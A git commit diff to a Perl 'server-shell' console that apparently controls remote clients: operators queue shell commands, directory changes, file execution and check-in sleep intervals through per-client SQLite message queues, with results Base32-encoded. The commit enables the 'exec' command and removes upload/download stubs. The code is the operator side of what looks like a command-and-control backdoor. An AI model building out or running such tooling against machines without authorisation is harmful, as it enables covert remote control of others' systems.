ee6f45a92c1757122a6180b586daf96439dd51e8
i128 <jarsnah12@gmail.com>
2014-01-28 23:06:43 -0600

    Update server-shell.pl
    Added new command, exec. 
    removed non functioning code for uploads/downloads.

--- server-shell.pl
+++ server-shell.pl
@@ -51,28 +51,19 @@ sub parse_cmd {
 	if ($typed_cmd =~ /^help$/i) {
 		help();
 		return 0;
-	} elsif($typed_cmd =~ /^upload (.*) (.*)/) {
-		#upload();
-		print "NOT IMPLEMENTED YET\n";
-		return 0
-	} elsif($typed_cmd =~ /^download (.*) (.*)/) {
-		#download();
-		print "NOT IMPLEMENTED YET\n";
-		return 0;
 	} elsif($typed_cmd =~ /^sleep (\d+)/) {
-		#client_sleep();
 		my $sleep_value = $1;
-		if($sleep_value > 0 && $sleep_value < 65536) {
+		if($sleep_value > 0 && $sleep_value < 61) {
 			send_msg($1, "SLEEP");
 			return 1;
 		} else {
-			print "Value must be between 1-65535\n";
+			print "Value must be between 1-60\n";
 			return 0;
 		}
-	} elsif($typed_cmd =~ /^exec (.*)/) {
-		#client_exec();
-		print "NOT IMPELEMNTED YET\n";
-		return 0;
+	} elsif($typed_cmd =~ /^exec (.*)/i) {
+		#print "NOT IMPELEMNTED YET\n";
+		send_msg($1, "EXEC");
+		return 1;
 	} elsif($typed_cmd =~ /^cd (.*)/i) {
  		send_msg($1, "CWD");
 		return 1;
@@ -85,6 +76,8 @@ sub parse_cmd {
 			print "Value must be either ON or OFF.\n";
 		}
 		return 0;
+	} elsif($typed_cmd =~ /exit/i) {
+		exit 0;
 	} else {
 		send_msg($typed_cmd, "CMD");
 		return 1;
@@ -95,11 +88,10 @@ sub help {
 	print "Available Commands:\tArguments\tDescription\n";
 	print "#######################################################################################################################\n";
 	print "  [cmd]\t\t\t[args]\t\tType any command, like whoami, hostname, etc.\n";
-	print "  upload\t\t[src] [dst]\tUploads a file [src] to [dst]. Type full path.\n";
-	print "  download\t\t[src] [dst]\tDownloads a file [src] to [dst]. Type full path.\n";
 	print "  sleep\t\t\t[1...65535]\tSet the client to only check in ever x seconds.\n";
 	print "  exec\t\t\t[file]\t\tExecutes a file as a seperate proccess.\n";
 	print "  debug\t\t\t[on|off]\tEnables or Disables debug messaging to console.\n";
+	print "  exit\t\t\t\t\tCloses Shell.\n";
 	print "  help\t\t\t\t\tDisplays this menu.\n";
 	print "#######################################################################################################################\n";
 }
@@ -123,11 +115,8 @@ sub recieve_msg {
         $sth->finish();
         $dbh->disconnect();
 
-	if ($client_cmd eq "UPLOAD") {
-		debug("CLIENT COMMAND", $client_cmd);
-	} elsif ($client_cmd eq "DOWNLOAD") {
-                debug("CLIENT COMMAND", $client_cmd);
-	} elsif ($client_cmd eq "SLEEP") {
+	# I dont think we need to have each use case here, we may be able to combine to a sinlge if/else
+	if (($client_cmd eq "SLEEP") or ($client_cmd eq "CMD") or ($client_cmd eq "CWD") or ($client_cmd eq "EXEC")) {
                 debug("CLIENT COMMAND", $client_cmd);
                 $dbh = DBI->connect("dbi:SQLite:$client_id.db") or die $DBI::errstr;
                 $sth = $dbh->prepare("SELECT CLIENT_MSG_QUEUE FROM msg_queue");
@@ -148,52 +137,52 @@ sub recieve_msg {
                 $dbh->disconnect();
                 return $return;
 	
-	} elsif ($client_cmd eq "EXEC") {
-                debug("CLIENT COMMAND", $client_cmd);
-	} elsif ($client_cmd eq "CMD") {
-                debug("CLIENT COMMAND", $client_cmd);
-		$dbh = DBI->connect("dbi:SQLite:$client_id.db") or die $DBI::errstr;
-        	$sth = $dbh->prepare("SELECT CLIENT_MSG_QUEUE FROM msg_queue");
-        	$sth->execute();
+	#} elsif ($client_cmd eq "EXEC") {
+        #        debug("CLIENT COMMAND", $client_cmd);
+	#} elsif ($client_cmd eq "CMD") {
+        #        debug("CLIENT COMMAND", $client_cmd);
+	#	$dbh = DBI->connect("dbi:SQLite:$client_id.db") or die $DBI::errstr;
+        #	$sth = $dbh->prepare("SELECT CLIENT_MSG_QUEUE FROM msg_queue");
+        #	$sth->execute();
 
-	        my @row = $sth->fetchrow_array();
-        	if (length($row[0]) >  0) {
-                	if (($row[0] ne "NULL") && (MIME::Base32::decode($row[0]) ne "NULL")) { # JBEQ = NULL
-                        	debug("ENTRY", MIME::Base32::decode($row[0]));
-	                        $return = MIME::Base32::decode($row[0]);
-        	        }
-	        }
+	#        my @row = $sth->fetchrow_array();
+        #	if (length($row[0]) >  0) {
+        #        	if (($row[0] ne "NULL") && (MIME::Base32::decode($row[0]) ne "NULL")) { # JBEQ = NULL
+        #                	debug("ENTRY", MIME::Base32::decode($row[0]));
+	#                        $return = MIME::Base32::decode($row[0]);
+        #	        }
+	#        }
         	#print "CLIENT_MSG_QUEUE: $row[0]\n";
-		debug("CLIENT_MSG_QUEUE", "CLEARED");
-	        $sth = $dbh->prepare("UPDATE msg_queue SET CLIENT_MSG_QUEUE='NULL'");
-        	$sth->execute();
-	        $sth->finish();
-        	$dbh->disconnect();
-	        return $return;
+	#	debug("CLIENT_MSG_QUEUE", "CLEARED");
+	#        $sth = $dbh->prepare("UPDATE msg_queue SET CLIENT_MSG_QUEUE='NULL'");
+        #	$sth->execute();
+	#        $sth->finish();
+        #	$dbh->disconnect();
+	#        return $return;
 
-	} elsif ($client_cmd eq "CWD") { 
-		debug("CLIENT COMMAND", $client_cmd);
-                $dbh = DBI->connect("dbi:SQLite:$client_id.db") or die $DBI::errstr;
-                $sth = $dbh->prepare("SELECT CLIENT_MSG_QUEUE FROM msg_queue");
-                $sth->execute();
+	#} elsif ($client_cmd eq "CWD") { 
+	#	debug("CLIENT COMMAND", $client_cmd);
+        #        $dbh = DBI->connect("dbi:SQLite:$client_id.db") or die $DBI::errstr;
+        #        $sth = $dbh->prepare("SELECT CLIENT_MSG_QUEUE FROM msg_queue");
+        #        $sth->execute();
 
-                my @row = $sth->fetchrow_array();
-                if (length($row[0]) >  0) {
-                        if (($row[0] ne "NULL") && (MIME::Base32::decode($row[0]) ne "NULL")) { # JBEQ = NULL
-                                debug("ENTRY", MIME::Base32::decode($row[0]));
-                                $return = MIME::Base32::decode($row[0]);
-                        }
-                }
-                #print "CLIENT_MSG_QUEUE: $row[0]\n";
-                debug("CLIENT_MSG_QUEUE", "CLEARED");
-                $sth = $dbh->prepare("UPDATE msg_queue SET CLIENT_MSG_QUEUE='NULL'");
-                $sth->execute();
-                $sth = $dbh->prepare("UPDATE cmd_queue SET CLIENT_CMD='NULL'");
-                $sth->execute();
+        #        my @row = $sth->fetchrow_array();
+        #        if (length($row[0]) >  0) {
+        #                if (($row[0] ne "NULL") && (MIME::Base32::decode($row[0]) ne "NULL")) { # JBEQ = NULL
+        #                        debug("ENTRY", MIME::Base32::decode($row[0]));
+        #                        $return = MIME::Base32::decode($row[0]);
+        #                }
+        #        }
+        #        #print "CLIENT_MSG_QUEUE: $row[0]\n";
+        #        debug("CLIENT_MSG_QUEUE", "CLEARED");
+        #        $sth = $dbh->prepare("UPDATE msg_queue SET CLIENT_MSG_QUEUE='NULL'");
+        #        $sth->execute();
+        #        $sth = $dbh->prepare("UPDATE cmd_queue SET CLIENT_CMD='NULL'");
+        #        $sth->execute();
 
-		$sth->finish();
-                $dbh->disconnect();
-                return $return;
+	#	$sth->finish();
+        #        $dbh->disconnect();
+        #        return $return;
 	
 	}elsif ($client_cmd eq "NULL") {
 		return 0;
